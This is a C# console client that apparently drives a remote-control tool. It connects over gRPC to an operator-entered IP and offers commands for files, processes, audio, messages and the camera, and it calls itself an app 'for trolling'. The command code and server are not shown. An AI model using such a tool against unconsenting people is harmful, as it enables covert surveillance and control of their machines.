﻿using AForge.Video;
using AForge.Video.DirectShow;
using Client.Commands;
using Grpc.Core;
using System;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.Diagnostics.Tracing;
using System.Drawing;

namespace Client
{
    internal class Program
    {
        private const int SERVERPORT = 6570;

        private static GrpcManager grpcManager;

        static void Main(string[] args)
        {
            Console.WriteLine("welcome to Manag application");

            AppLoop();
            //Testing();
        }
        static void AppLoop()
        {
            while (true)
            {
                Console.WriteLine("enter ip address:");
                Thread.Sleep(1200);
                //var address = "localhost";
                var address = Console.ReadLine();

                if (string.IsNullOrEmpty(address))
                {
                    continue;
                }

                try
                {
                    grpcManager = new GrpcManager($"http://{address}:{SERVERPORT}");

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("successfull connected");
                    Console.ResetColor();

                    CommandLoop();
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(ex.ToString());
                    Console.ResetColor();
                }
            }
        }
        static void CommandLoop()
        {
            var rootCommand = new RootCommand("Manag app for trolling")
            {
                new FileManagerCommand(grpcManager),
                new SettingsCommand(grpcManager),
                new ProcessCommand(grpcManager),
                new AudioCommand(grpcManager),
                new InfoCommand(grpcManager),
                new MessageCommand(grpcManager),
                new CameraCommand(grpcManager),
            };

            var commandLineBuilder = new CommandLineBuilder(rootCommand);

            commandLineBuilder.AddMiddleware(async (context, next) =>
            {
                try
                {
                    await next(context);

                    if (context.ParseResult.Errors.Count == 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("command send successfully");
                    }
                }
                catch (RpcException ex) when (ex.StatusCode == StatusCode.DeadlineExceeded)
                {
                    Console.ForegroundColor = ConsoleColor.Red;

                    Console.WriteLine("command timeout");
                }
                catch (RpcException ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;

                    Console.WriteLine("Status code: " + ex.Status.StatusCode);
                    Console.WriteLine("Message: " + ex.Status.Detail);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;

                    Console.WriteLine(ex.Message);
                }
                finally
                {
                    Console.ResetColor();
                }
            });

            commandLineBuilder.UseDefaults();
            var parser = commandLineBuilder.Build();

            while (true)
            {
                Console.Write("> ");

                var command = Console.ReadLine();

                if (command is not null)
                {
                    if (command == "exit")
                    {
                        grpcManager.Dispose();
                        return;
                    }

                    var code = parser.Invoke(command);
                }
            }
        }

        static void Testing()
        {
        }
    }

    
}

//tls, interceptor, log, errors, ip list, security,